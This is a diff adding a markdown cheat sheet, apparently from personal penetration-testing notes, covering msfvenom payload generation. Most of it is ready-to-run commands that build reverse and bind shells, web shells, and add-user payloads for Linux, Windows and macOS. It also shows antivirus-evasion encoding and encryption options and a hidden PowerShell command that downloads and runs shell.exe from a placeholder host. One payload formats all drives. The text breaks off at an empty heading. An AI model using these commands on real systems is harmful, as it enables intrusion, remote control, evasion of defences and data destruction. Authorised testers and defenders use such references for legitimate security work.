@@ -1,0 +1,1203 @@
+# MSFVenom
+
+## 01 - Basic Usage
+
+### 1.1 - Platforms
+
+- To List all Platforms
+
+```
+$ msfvenom -l platforms
+
+Framework Platforms [--platform <value>]
+========================================
+
+    Name
+    ----
+    aix
+    android
+    apple_ios
+    arista
+    brocade
+    bsd
+    bsdi
+    cisco
+    firefox
+    freebsd
+    hardware
+    hpux
+    irix
+    java
+    javascript
+    juniper
+    linux
+    mainframe
+    mikrotik
+    multi
+    netbsd
+    netware
+    nodejs
+    openbsd
+    osx
+    php
+    python
+    r
+    ruby
+    solaris
+    unifi
+    unix
+    unknown
+    windows
+```
+
+`$ cat payload.bin | msfvenom -p - -a x64 --platform windows -f exe -o shell-x64.exe`
+
+### 1.2 - Architectures
+
+- To list all the architectures
+
+`$ msfvenom -l archs`
+
+`$ msfvenom -a x64 -p windows/x64/exec cmd=notepad.exe -f exe -o shell-x64.exe`
+
+### 1.3 - Formats
+
+- To List all Formats
+
+```
+$ msfvenom -l formats
+
+
+Framework Executable Formats [--format <value>]
+===============================================
+
+    Name
+    ----
+    asp
+    aspx
+    aspx-exe
+    axis2
+    dll
+    elf
+    elf-so
+    exe
+    exe-only
+    exe-service
+    exe-small
+    hta-psh
+    jar
+    jsp
+    loop-vbs
+    macho
+    msi
+    msi-nouac
+    osx-app
+    psh
+    psh-cmd
+    psh-net
+    psh-reflection
+    python-reflection
+    vba
+    vba-exe
+    vba-psh
+    vbs
+    war
+
+Framework Transform Formats [--format <value>]
+==============================================
+
+    Name
+    ----
+    base32
+    base64
+    bash
+    c
+    csharp
+    dw
+    dword
+    go
+    golang
+    hex
+    java
+    js_be
+    js_le
+    nim
+    nimlang
+    num
+    perl
+    pl
+    powershell
+    ps1
+    py
+    python
+    raw
+    rb
+    ruby
+    rust
+    rustlang
+    sh
+    vbapplication
+    vbscript
+```
+
+`$ msfvenom -p linux/x86/shell/reverse_tcp lhost=<IP> lport=<PORT> -f c -o sc-x86.c`
+
+### 1.4 - Encoders
+
+- List of encoders
+
+```
+$ msfvenom -l encoders
+
+Framework Encoders [--encoder <value>]
+======================================
+
+    Name                          Rank       Description
+    ----                          ----       -----------
+    cmd/brace                     low        Bash Brace Expansion Command Encoder
+    cmd/echo                      good       Echo Command Encoder
+    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
+    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
+    cmd/perl                      normal     Perl Command Encoder
+    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
+    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
+    generic/eicar                 manual     The EICAR Encoder
+    generic/none                  normal     The "none" Encoder
+    mipsbe/byte_xori              normal     Byte XORi Encoder
+    mipsbe/longxor                normal     XOR Encoder
+    mipsle/byte_xori              normal     Byte XORi Encoder
+    mipsle/longxor                normal     XOR Encoder
+    php/base64                    great      PHP Base64 Encoder
+    ppc/longxor                   normal     PPC LongXOR Encoder
+    ppc/longxor_tag               normal     PPC LongXOR Encoder
+    ruby/base64                   great      Ruby Base64 Encoder
+    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
+    x64/xor                       normal     XOR Encoder
+    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
+    x64/xor_dynamic               normal     Dynamic key XOR Encoder
+    x64/zutto_dekiru              manual     Zutto Dekiru
+    x86/add_sub                   manual     Add/Sub Encoder
+    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
+    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
+    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
+    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
+    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
+    x86/bmp_polyglot              manual     BMP Polyglot
+    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
+    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
+    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
+    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
+    x86/countdown                 normal     Single-byte XOR Countdown Encoder
+    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
+    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
+    x86/nonalpha                  low        Non-Alpha Encoder
+    x86/nonupper                  low        Non-Upper Encoder
+    x86/opt_sub                   manual     Sub Encoder (optimised)
+    x86/service                   manual     Register Service
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+    x86/single_static_bit         manual     Single Static Bit
+    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
+    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
+    x86/xor_dynamic               normal     Dynamic key XOR Encoder
+```
+
+- To use an encoder with a compatible payload
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -e x86/shikata_ga_nai -i 9 -f c > payload-x86-encoded.c`
+
+### 1.5 - Encryption
+
+- List of encryption methods
+
+```
+$ msfvenom -l encrypt
+
+Framework Encryption Formats [--encrypt <value>]
+================================================
+
+    Name
+    ----
+    aes256
+    base64
+    rc4
+    xor
+```
+
+- Generating and encrypting payloads using the --encrypt flags
+
+**Note:** For AES256 encryption that the key (using flag `--encrypt-key`) must be exactly 32 bytes of length and the IV (using flag `--encrypt-iv`) must be 16 bytes of length
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt aes256 --encrypt-key 0123456789abcdefghijklmnopqrstuv --encrypt-iv 1234567890abcdef -f c -o payload_aes.c`
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt xor --encrypt-key x0rk3y -f c -o payload_xor.c`
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt rc4 --encrypt-key rc4passw0rd! -f c -o payload_rc4.c`
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> --encrypt base64 -f c -o payload_base64.c`
+
+### 1.6 - Payloads
+
+- To list the payloads options, for example:
+
+`$ msfvenom -p cmd/unix/reverse_netcat --list-options`
+
+- To list scripting payloads
+
+```
+$ msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
+..[snip]..
+```
+
+- To list payloads with a specific platform
+
+`$ msfvenom -l payloads --platform <platform>`
+
+- To list encoders with a specific platform
+
+`$ msfvenom -l encoders --platform <platform>`
+
+- To list payloads with a specific architecture
+
+`$ msfvenom -l payloads -a <architecture>`
+
+- To list encoders with a specific platform
+
+`$ msfvenom -l encoders -a <architecture>`
+
+## 02 - Generate Shellcode
+
+### 2.1 - Bad Characters
+
+- When removing bad characters `msfvenom` will warn you by throwing an error that in case if the shellcode have problems try to use with [[Pentesting Phases/Initial Access/Callback Shells/MSFVenom#1.4 - Encoders|Encoders]] to get around it. Here are the some specific payloads that I've played around with and this is the result I get:
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x00\xff\x0a\x0d" -f c > payload-x86.c`
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x00\x0a\x0d" -f c > payload-x64.c`
+
+`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x0a\x0d" -e x64/zutto_dekiru -i 9 -f c > payload-x64-enc.c`
+
+`$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x00\xff\x0a\x0d" -f c > payload-x86.c`
+
+`$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x00\x0a\x0d" -f c > payload-x64.c`
+
+`$ msfvenom -p windows/x64/exec cmd=cmd.exe -b "\x00\x0a\0xd" -f c > payload-x64.c`
+
+`$ msfvenom -p linux/x64/exec cmd=/bin/bash -b "\x00\x0a\x0d" -f c > payload-x64.c`
+
+### 2.2 - Assembler Code
+
+```
+$ msfvenom -p linux/x86/exec cmd=whoami R | ndisasm -u -
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 42 bytes
+
+00000000  6A0B              push byte +0xb
+00000002  58                pop eax
+00000003  99                cdq
+00000004  52                push edx
+00000005  66682D63          push word 0x632d
+00000009  89E7              mov edi,esp
+0000000B  682F736800        push dword 0x68732f
+00000010  682F62696E        push dword 0x6e69622f
+00000015  89E3              mov ebx,esp
+00000017  52                push edx
+00000018  E807000000        call 0x24
+0000001D  7768              ja 0x87
+0000001F  6F                outsd
+00000020  61                popa
+00000021  6D                insd
+00000022  6900575389E1      imul eax,[eax],dword 0xe1895357
+00000028  CD80              int 0x80
+```
+
+### 2.3 - Shellcode Format
+
+- **Pipe it through hexdump**
+
+```
+$ msfvenom -p linux/x86/exec cmd=whoami R | hexdump -v -e '"\\\x" 1/1 "%02x"'
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 42 bytes
+
+\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x57\x53\x89\xe1\xcd\x80
+```
+
+- **Any raw shellcode binary even if it's not related to metasploit using via generic/custom payload**
+
+`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw > payload-x86.bin`
+
+`$ msfvenom -p generic/custom payloadfile=./payload-x86.bin -a x86 --platform windows -f c -o sc.c`
+
+- You can also use a calculator program as a shellcode
+
+`$ msfvenom -p generic/custom payloadfile=/home/user/calc.exe -a x64 --platform windows -f vba-exe`
+
+- **Pipe it through msfvenom**
+
+`$ cat payload-x86.bin | msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -f c -i 9`
+
+- **Generate formatted Pascal shellcode**
+
+`$ msfvenom -p <payload> -f c | sed -r 's/[\x]+/$/g' | sed -r 's/[\]+/,/g' | sed -r 's/["]+//g' | sed -e 's/$/\,/' | cut -c 2-`
+
+### 2.4 - Scripting Payloads
+
+#### 2.4.1 - Reverse Shells
+
+##### 2.4.1.1 - Linux
+
+- **Awk**
+
+`$ msfvenom -p cmd/unix/reverse_awk lhost=<IP> lport=<PORT>`
+
+- **Bash**
+
+`$ msfvenom -p cmd/unix/reverse_bash lhost=<IP> lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>`
+
+- **Python**
+
+`$ msfvenom -p cmd/unix/reverse_python lhost=<IP> lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+
+- **PHP**
+
+`$ msfvenom -p cmd/unix/reverse_php_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+
+- **Perl**
+
+`$ msfvenom -p cmd/unix/reverse_perl lhost=<IP> lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/reverse_perl_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+
+- **SSH**
+
+`$ msfvenom -p cmd/unix/reverse_ssh lhost=<IP> lport=<PORT>`
+
+- **OpenSSL**
+
+`$ msfvenom -p cmd/unix/reverse_openssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+
+- **Zsh**
+
+`$ msfvenom -p cmd/unix/reverse_zsh lhost=<IP> lport=<PORT>`
+
+- **Ksh**
+
+`$ msfvenom -p cmd/unix/reverse_ksh lhost=<IP> lport=<PORT>`
+
+- **Ruby**
+
+`$ msfvenom -p cmd/unix/reverse_ruby lhost=<IP> lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/reverse_ruby_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+
+- **Java**
+
+`$ msfvenom -p cmd/unix/reverse_jjs lhost=<IP> lport=<PORT>`
+
+- **Lua**
+
+`$ msfvenom -p cmd/unix/reverse_lua lhost=<IP> lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/reverse_ncat_ssl handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+
+- **Tclsh**
+
+`$ msfvenom -p cmd/unix/reverse_tclsh lhost=<IP> lport=<PORT>`
+
+- **R**
+
+`$ msfvenom -p cmd/unix/reverse_r lhost=<IP> lport=<PORT>`
+
+- **Netcat**
+
+1. **OpenBSD Method**
+
+`$ msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<PORT>`
+
+2. **Traditional GNU Method**
+
+`$ msfvenom -p cmd/unix/reverse_netcat_gaping lhost=<IP> lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/pingback_reverse lhost=<IP> lport=<PORT>`
+
+- **Telnet**
+
+`$ msfvenom -p cmd/unix/reverse_ssl_double_telnet handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>`
+
+##### 2.4.1.2 - Windows
+
+- **Java**
+
+`$ msfvenom -p cmd/windows/jjs_reverse_tcp lhost=<IP> lport=<PORT>`
+
+- **Powershell**
+
+`$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o shell.bat`
+
+#### 2.4.2 - Bind Shells
+
+##### 2.4.2.1 - Linux
+
+- **Awk**
+
+`$ msfvenom -p cmd/unix/bind_awk lport=<PORT>`
+
+- **Busybox**
+
+`$ msfvenom -p cmd/unix/bind_busybox_telnetd lport=<PORT>`
+
+- **Perl**
+
+`$ msfvenom -p cmd/unix/bind_perl lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/bind_perl_ipv6 lport=<PORT>`
+
+- **Zsh**
+
+`$ msfvenom -p cmd/unix/bind_zsh lport=<PORT>`
+
+- **Ruby**
+
+`$ msfvenom -p cmd/unix/bind_ruby lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/bind_ruby_ipv6 lport=<PORT>`
+
+- **Java**
+
+`$ msfvenom -p cmd/unix/bind_jjs lport=<PORT>`
+
+- **Lua**
+
+`$ msfvenom -p cmd/unix/bind_lua lport=<PORT>`
+
+- **NodeJS**
+
+`$ msfvenom -p cmd/unix/bind_nodejs lport=<PORT>`
+
+- **R**
+
+`$ msfvenom -p cmd/unix/bind_r lport=<PORT>`
+
+- **Netcat**
+
+1. OpenBSD Method
+
+`$ msfvenom -p cmd/unix/bind_netcat lport=<PORT>`
+
+2. Traditional GNU Method
+
+`$ msfvenom -p cmd/unix/bind_netcat_gaping lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/bind_netcat_gaping_ipv6 lport=<PORT>`
+
+`$ msfvenom -p cmd/unix/pingback_bind lport=<PORT>`
+
+- **Socat**
+
+`$ msfvenom -p cmd/unix/bind_socat_udp lport=<PORT>`
+
+- **Telnet**
+
+`$ msfvenom -p cmd/unix/bind_inetd lport=<PORT>`
+
+#### 2.4.3 - Exec Payloads
+
+##### 2.4.3.1 - Generic
+
+- **Unix**
+
+`$ msfvenom -p cmd/unix/generic cmd=<unix_commands>`
+
+##### 2.4.3.2 - Add User
+
+- **Windows**
+
+`$ msfvenom -p cmd/windows/powershell/adduser user=sysadmin pass=Password1234! wmic=[true | false] custom=<group_name> -f raw`
+
+`$ msfvenom -p cmd/windows/powershell/dns_txt_query_exec -f raw`
+
+##### 2.4.3.3 - Download and Execute
+
+- **Windows**
+
+`$ msfvenom -p cmd/windows/powershell/download_exec`
+
+##### 2.4.3.4 - DNS TXT Query Exec
+
+- **Windows**
+
+`$ msfvenom -p cmd/windows/powershell/dns_txt_query_exec dnszone=<domain.com>`
+
+##### 2.4.3.5 - Execute
+
+- **Windows**
+
+`$ msfvenom -p cmd/windows/powershell/exec cmd=<commands>`
+
+`$ msfvenom -p cmd/windows/powershell/loadlibrary dll=C:\\path\\to\\shell.dll exitfunc=<seh | thread | process | none>`
+
+`$ msfvenom -p cmd/windows/powershell/messagebox icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> text="<text>" title="<title>" exitfunc=<seh | thread | process | none>`
+
+`$ msfvenom -p cmd/windows/powershell/x64/exec cmd=<commands>`
+
+`$ msfvenom -p cmd/windows/powershell/x64/loadlibrary dll=C:\\path\\to\\shell.dll exitfunc=<seh | thread | process | none>`
+
+`$ msfvenom -p cmd/windows/powershell/x64/messagebox icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> text="<text>" title="<title>" exitfunc=<seh | thread | process | none>`
+
+##### 2.4.3.6 - Text-To-Speech
+
+- **Windows**
+
+`$ msfvenom -p cmd/windows/powershell/speak_pwned`
+
+### 2.5 - Regular Payloads
+
+#### 2.5.1 - Reverse Shells
+
+##### 2.5.1.1 - Staged Windows Reverse Shells
+
+- **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/shell/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x86.exe`
+
+`$ msfvenom -p windows/shell/reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password="<KEY>" -f exe -o shell-enc-x86.exe`
+
+`$ msfvenom -p windows/shell/reverse_udp lhost=<IP> lport=<PORT> -f exe -o shell-x86.exe`
+
+- **x86_64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.exe`
+
+`$ msfvenom -p windows/x64/shell/reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password="<KEY>" -f exe -o shell-enc-x64.exe`
+
+##### 2.5.1.2 - Staged Linux Reverse Shells
+
+- **x86 (32-bit) Payloads**
+
+`$ msfvenom -p linux/x86/shell/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x86`
+
+- **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p linux/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x64`
+
+##### 2.5.1.3  - Staged Linux Reverse Shells
+
+1. **PHP**
+
+`$ msfvenom -p php/reverse_php lhost=<IP> lport=<PORT> -f raw -o shell.php`
+
+`$ msfvenom -p php/reverse_perl lhost=<IP> lport=<PORT> -f raw -o shell.php`
+
+`$ cat shell.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> shell.php`
+
+2. **ASP**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/shell/reverse_tcp lhost=<IP> lport=<PORT> -f asp -o shell-x86.asp`
+
+- x86_64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.asp`
+
+3. **ASPX**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/shell/reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o shell-x86.aspx`
+
+- x86_64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o shell-x64.aspx`
+
+##### 2.5.1.4 - Stageless Python Reverse Shells
+
+`$ msfvenom -p python/shell_reverse_tcp lhost=<IP> lport=<PORT> -o shell.py`
+
+`$ msfvenom -p python/shell_reverse_tcp_ssl lhost=<IP> lport=<PORT> -o shell.py`
+
+`$ msfvenom -p python/shell_reverse_udp lhost=<IP> lport=<PORT> -o shell.py`
+
+##### 2.5.1.5  - Stageless Windows Reverse Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p cmd/windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> -o shell.ps1`
+
+`$ msfvenom -p windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> -o shell.ps1`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.exe`
+
+`$ msfvenom -p windows/x64/shell_reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password="<KEY>" -f exe -o shell-x64.exe`
+
+`$ msfvenom -p windows/x64/encrypted_shell_reverse_tcp chachakey=1234567890abcdef1234567890abdcef chachanonce=1234567890ab lhost=<IP> lport=<PORT> -f exe -o shell-enc-x64.exe`
+
+`$ msfvenom -p windows/x64/powershell_reverse_tcp lhost=<IP> lport=<PORT> -o shell-x64.ps1`
+
+##### 2.5.1.6  - Stageless Linux Reverse Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x86`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p linux/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x64`
+
+##### 2.5.1.7 -  Stageless Mac OSX Reverse Shells
+
+`$ msfvenom -p osx/x86/shell_reverse_tcp lhost=<IP> lport=<PORT> -f macho -o shell_x86`
+
+`$ msfvenom -p osx/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f macho -o shell_x64`
+
+##### 2.5.1.8  - Stageless Reverse Webshells
+
+1. **ASP**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f asp -o shell-x86.asp`
+
+- x86_64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f asp -o shell-x86-64.asp`
+
+2. **ASPX**
+
+- x86 (32-bit) Payloads
+
+`$ msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o shell-x86.aspx`
+
+- x86_64 (64-bit) Payloads
+
+`$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o shell-x86-64.aspx`
+
+3. **JSP**
+
+`$ msfvenom -p java/jsp_shell_reverse_tcp lhost=<IP> lport=<PORT> -f raw -o shell.jsp`
+
+4. **War**
+
+`$ msfvenom -p java/jsp_shell_reverse_tcp lhost=<IP> lport=<PORT> -f raw -o shell.war`
+
+#### 2.5.2 - Bind Shells
+
+##### 2.5.2.1 - Staged Windows Bind Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/shell/bind_tcp lport=<PORT> -f exe -o shell-x86.exe`
+
+`$ msfvenom -p windows/shell/bind_hidden_tcp ahost=<IP> lport=<PORT> -f exe -o hidden-shell-x86.exe`
+
+`$ msfvenom -p windows/shell/bind_tcp_rc4 lport=<PORT> rc4password=<KEY> -f exe -o shell-x86.exe`
+
+For the SMB pipe the default for LPORT will always be port 445
+
+`$ msfvenom -p windows/shell/bind_named_pipe lport=<PORT> pipename=<PIPENAME> -f exe -o shell-x86.exe`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/shell/bind_tcp lport=<PORT> -f exe -o shell-x86-64.exe`
+
+`$ msfvenom -p windows/x64/shell/bind_tcp_rc4 lport=<PORT> rc4password=<KEY> -f exe -o shell-x86-64.exe`
+
+##### 2.5.2.2 - Staged Linux Bind Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p linux/x86/shell/bind_tcp lport=<PORT> -f elf -o shell-x86`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p linux/x64/shell/bind_tcp lport=<PORT> -f elf -o shell-x86-64`
+
+##### 2.5.2.3 - Staged Bind Webshells
+
+1. **PHP**
+
+`$ msfvenom -p php/bind_php lhost=<IP> lport=<PORT> -f raw -o shell.php`
+
+`$ msfvenom -p php/bind_perl lport=<PORT> -f raw -o shell.php`
+
+`$ cat shell.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> shell.php`
+
+2. **ASP**
+
+`$ msfvenom -p windows/shell/bind_tcp lport=<PORT> -f asp -o shell-x86.asp`
+
+`$ msfvenom -p windows/x64/shell_bind_tcp lport=<PORT> -f asp -o shell-x64.asp`
+
+3. **ASPX**
+
+`$ msfvenom -p windows/shell/bind_tcp lport=<PORT> -f aspx -o shell-x86.aspx`
+
+`$ msfvenom -p windows/x64/shell_bind_tcp lport=<PORT> -f aspx -o shell-x64.aspx`
+
+##### 2.5.2.4 - Stageless Python Bind Shells
+
+`$ msfvenom -p python/shell_bind_tcp lport=<PORT> -o shell.py`
+
+##### 2.5.2.5 - Stageless Windows Bind Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p windows/shell_bind_tcp lport=<PORT> -f exe -o shell-x86.exe`
+
+`$ msfvenom -p windows/shell_bind_hidden_tcp ahost=<IP> lport=<PORT> -f exe -o hidden-shell-x86.exe`
+
+`$ msfvenom -p cmd/windows/powershell_bind_tcp lport=<PORT> -o shell.ps1`
+
+`$ msfvenom -p windows/powershell_bind_tcp lport=<PORT> -o shell.ps1`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p windows/x64/shell_bind_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x86-64.exe`
+
+`$ msfvenom -p windows/x64/powershell_bind_tcp lport=<PORT> -o shell-x86-64.ps1`
+
+##### 2.5.2.6 - Stageless Linux Bind Shells
+
+1. **x86 (32-bit) Payloads**
+
+`$ msfvenom -p linux/x86/shell_bind_tcp lport=<PORT> -f elf -o shell-x86`
+
+2. **x86-64 (64-bit) Payloads**
+
+`$ msfvenom -p linux/x64/shell_bind_tcp lport=<PORT> -f elf -o shell-x86-64`
+
+##### 2.5.2.7 - Stageless Mac OSX Bind Shells
+
+`$ msfvenom -p osx/x86/shell_bind_tcp lport=<PORT> -f macho -o shell_x86`
+
+`$ msfvenom -p osx/x64/shell_bind_tcp lport=<PORT> -f macho -o shell_x64`
+
+##### 2.5.2.8 - Stageless Bind Webshells
+
+1. **JSP**
+
+`$ msfvenom -p java/jsp_shell_bind_tcp lport=<PORT> -f raw -o shell.jsp`
+
+2. **War**
+
+`$ msfvenom -p java/jsp_shell_bind_tcp lport=<PORT> -f raw -o shell.war`
+
+#### 2.5.3 - Exec Payloads
+
+##### 2.5.3.1 - Add User Windows Exec Payload
+
+`$ msfvenom -p windows/adduser user=<username> pass=Password1234! wmic=false custom=<group_name>`
+
+##### 2.5.3.2 - Add User Linux Exec Payload
+
+`$ msfvenom -p linux/x86/adduser user=<username> pass=<password> shell=/bin/sh -f elf`
+
+##### 2.5.3.3 - DNS TXT Query Exec Windows Payload
+
+`$ msfvenom -p windows/dns_txt_query_exec dnszone=<domain.com> -f exe -o dns-query-x86.exe`
+
+##### 2.5.3.4 - Execute Windows Exec Payload
+
+`$ msfvenom -p windows/exec cmd=<commands> -f exe -o exec-x86.exe`
+
+`$ msfvenom -p windows/x64/exec cmd=<commands> -f exe -o exec-x64.exe`
+
+`$ msfvenom -p windows/x64/exec cmd="powershell.exe -w hidden -noni -nop -c \"IEX (new-object net.webclient).downloadfile('http://<IP>:<PORT>/shell.exe', 'C:\Windows\Temp\shell.exe');start-process C:\Windows\Temp\shell.exe\"" -f exe -o exec-x64.exe`
+
+##### 2.5.3.5 - Execute Linux Exec Payload
+
+`$ msfvenom -p linux/x86/chmod file=/path/to/file mode=0777 -f elf -o exec-chmod-file-x86`
+
+`$ msfvenom -p linux/x86/exec cmd=<command> -f elf -o exec-cmd-x86`
+
+`$ msfvenom -p linux/x86/read_file fd=1 path=/path/to/file -f elf -o read-file-x86`
+
+##### 2.5.3.6 - Execute OSX Exec Payload
+
+`$ msfvenom -p osx/x86/exec cmd=<command> -f macho -o exec-cmd-x86`
+
+`$ msfvenom -p osx/x64/exec cmd=<command> -f macho -o exec-cmd-x64`
+
+##### 2.5.3.7 - Execute BSD Exec Payload
+
+`$ msfvenom -p bsd/x86/exec cmd=<commands> -f elf -o exec-cmd-x86`
+
+`$ msfvenom -p bsd/x64/exec cmd=<commands> -f elf -o exec-cmd-x64`
+
+##### 2.5.3.8 - Execute Webshells Exec Payload
+
+`$ msfvenom -p php/exec cmd=<commands> -f raw -o exec.php`
+
+`$ cat exec.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> exec.php`
+
+##### 2.5.3.9 - Text-To-Speech Windows Exec Payload
+
+`$ msfvenom -p windows/speak_pwned -f exe -o speak-x86.exe`
+
+##### 2.5.3.10 - Text-To-Speech OSX Exec Payload
+
+`$ msfvenom -p osx/x64/say text=<message> -f macho -o speak-x64`
+
+##### 2.5.3.11 - Format All Drives Windows Exec Payload
+
+`$ msfvenom -p windows/format_all_drives volumelabel=<label> -f exe -o wiper-x86.exe`
+
+##### 2.5.3.12 - Messagebox Windows Exec Payload
+
